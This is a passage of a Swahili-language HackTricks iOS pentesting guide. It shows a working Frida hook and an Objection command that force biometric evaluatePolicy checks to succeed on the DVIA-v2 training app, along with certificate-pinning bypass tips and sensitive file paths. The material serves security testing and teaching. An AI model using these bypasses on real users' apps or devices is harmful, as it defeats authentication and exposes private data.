Kupitia **Objection Biometrics Bypass**, iliyopo kwenye [ukurasa huu wa GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), njia inapatikana ya kuvuka kifaa cha **LocalAuthentication**. Msingi wa njia hii ni kutumia **Frida** kubadilisha kazi ya `evaluatePolicy`, kuhakikisha kuwa daima inatoa matokeo ya `True`, bila kujali mafanikio halisi ya uthibitishaji. Hii ni muhimu sana katika kuzunguka mchakato dhaifu wa uthibitishaji wa kibaolojia.

Kuamsha kudukuzi huu, tumia amri ifuatayo:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Amri hii inasababisha mfululizo ambapo Objection inasajili kazi ambayo inabadilisha matokeo ya ukaguzi wa `evaluatePolicy` kuwa `True`.

#### Frida

Mfano wa matumizi ya **`evaluatePolicy`** kutoka kwenye programu ya [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Kuwezesha **kupitisha** ya Uthibitishaji wa Ndani, hati ya Frida imeandikwa. Hati hii inalenga ukaguzi wa **evaluatePolicy**, ikikatiza wito wake ili kuhakikisha inarudisha **matokeo=1** ya mafanikio. Kwa kubadilisha tabia ya wito, ukaguzi wa uthibitishaji unapitishwa kwa ufanisi.

Hati ifuatayo imeingizwa ili kubadilisha matokeo ya njia ya **evaluatePolicy**. Inabadilisha matokeo ya wito kuonyesha mafanikio daima.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Kutuma amri ifuatayo ili kuingiza skripti ya Frida na kuepuka uthibitisho wa kibaolojia:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Kufichua Ufunuo wa Utendaji Sensitivu Kupitia IPC

### Wamiliki wa URI Walioboreshwa / Viungo vya Kina / Mbinu za Kipekee

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Viungo vya Universal

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Kushiriki kwa UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Programu za Programu

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Ufumaji na Ufananuzi

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Mawasiliano ya Mtandao

Ni muhimu kuhakikisha kuwa hakuna mawasiliano yanayotokea **bila kusimbwa** na pia kwamba programu inathibitisha kwa usahihi **cheti cha TLS** cha seva.\
Kwa kuchunguza masuala kama haya, unaweza kutumia wakala kama **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ukaguzi wa Jina la Mwenyeji

Moja ya masuala ya kawaida ya kuthibitisha cheti cha TLS ni kuhakikisha kuwa cheti kilisainiwa na **CA iliyosadikika**, lakini **hakikisha** kwamba **jina la mwenyeji** wa cheti ni jina la mwenyeji linalofikiwa.\
Ili kuchunguza suala hili kwa kutumia Burp, baada ya kusadikisha CA ya Burp kwenye iPhone, unaweza **kuunda cheti kipya na Burp kwa jina la mwenyeji tofauti** na kulitumia. Ikiwa programu bado inafanya kazi, basi kuna udhaifu fulani.

### Kupiga Cheti

Ikiwa programu inatumia Kupiga SSL kwa usahihi, basi programu itafanya kazi tu ikiwa cheti ni kile kinachotarajiwa. Wakati wa kujaribu programu, **hii inaweza kuwa tatizo kwani Burp itatumikia cheti chake.**\
Ili kuzunguka ulinzi huu ndani ya kifaa kilichovunjwa, unaweza kusakinisha programu [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) au kusakinisha [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Pia unaweza kutumia **objection's** `ios sslpinning disable`

## Mambo Mbalimbali

* Katika **`/System/Library`** unaweza kupata fremu zilizosakinishwa kwenye simu zinazotumiwa na programu za mfumo
* Programu zilizosakinishwa na mtumiaji kutoka kwenye Duka la Programu zinapatikana ndani ya **`/User/Applications`**
* Na **`/User/Library`** ina data iliyohifadhiwa na programu za kiwango cha mtumiaji
* Unaweza kupata ufikiaji wa **`/User/Library/Notes/notes.sqlite`** ili kusoma maelezo yaliyohifadhiwa ndani ya programu.
* Ndani ya saraka ya programu iliyosakinishwa (**`/User/Applications/<APP ID>/`**) unaweza kupata faili za kuvutia:
* **`iTunesArtwork`**: Nembo inayotumiwa na programu
* **`iTunesMetadata.plist`**: Habari za programu zinazotumiwa kwenye Duka la Programu
* **`/Library/*`**: Ina mapendekezo na akiba. Katika **`/Library/Cache/Snapshots/*`** unaweza kupata picha ya programu kabla ya kupelekwa nyuma.

### Kupachika Moto / Kuboresha Kwa Nguvu

Watengenezaji wanaweza **kupachika kwa mbali ufungaji wote wa programu yao mara moja** bila kusubiri kuwasilisha tena programu kwenye Duka la Programu na kusubiri idhini yake.\
Kwa kusudi hili kawaida hutumiwa [**JSPatch**](https://github.com/bang590/JSPatch)**.** Lakini kuna chaguzi nyingine pia kama [Siren](https://github.com/ArtSabintsev/Siren) na [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Hii ni mbinu hatari ambayo inaweza kutumiwa vibaya na SDK za tatu zenye nia mbaya, kwa hivyo inashauriwa kuchunguza ni njia gani inayotumiwa kwa sasisho za moja kwa moja (ikiwa ipo) na kuitumia.** Unaweza kujaribu kupakua toleo la awali la programu kwa kusudi hili.

### Watu wa Tatu

Changamoto kubwa na **SDK za watu wa tatu** ni **ukosefu wa udhibiti wa kina** juu ya utendaji wao. Watengenezaji wanakabiliwa na chaguo: au kuunganisha SDK na kukubali vipengele vyake vyote, pamoja na hatari za usalama na maswala ya faragha, au kuacha faida zake kabisa. Mara nyingi, watengenezaji hawawezi kusahihisha udhaifu ndani ya SDK hizi wenyewe. Zaidi ya hayo, wakati SDK zinapata imani katika jamii, baadhi zinaweza kuanza kuwa na programu hasidi.

Huduma zinazotolewa na SDK za watu wa tatu zinaweza kujumuisha ufuatiliaji wa tabia ya mtumiaji, kuonyesha matangazo, au kuboresha uzoefu wa mtumiaji. Walakini, hii inaleta hatari kwani watengenezaji hawawezi kuwa na ufahamu kamili wa namna kanuni inatekelezwa na maktaba hizi, ikisababisha hatari za faragha na usalama. Ni muhimu kuzuia habari iliyoshirikiwa na huduma za watu wa tatu kuwa ni ile inayohitajika tu na kuhakikisha kuwa hakuna data nyeti inafichuliwa.

Utekelezaji wa huduma za watu wa tatu kawaida unakuja katika aina mbili: maktaba ya kujitegemea au SDK kamili. Ili kulinda faragha ya mtumiaji, data yoyote iliyoshirikiwa na huduma hizi inapaswa kuwa **imefichwa utambulisho** ili kuzuia kufichua Habari Binafsi Inayoweza Kutambulika (PII).

Ili kutambua maktaba ambazo programu inatumia, amri ya **`otool`** inaweza kutumika. Zana hii inapaswa kutumiwa dhidi ya programu na kila maktaba iliyoshirikiwa inayotumiwa ili kugundua maktaba zaidi.
```bash
otool -L <application_path>
```
## **Marejeo na Rasilimali Zaidi**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Kozi ya bure ya IOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Toleo la Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Toleo la Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mchakato** wa kiotomatiki ulioendeshwa na zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
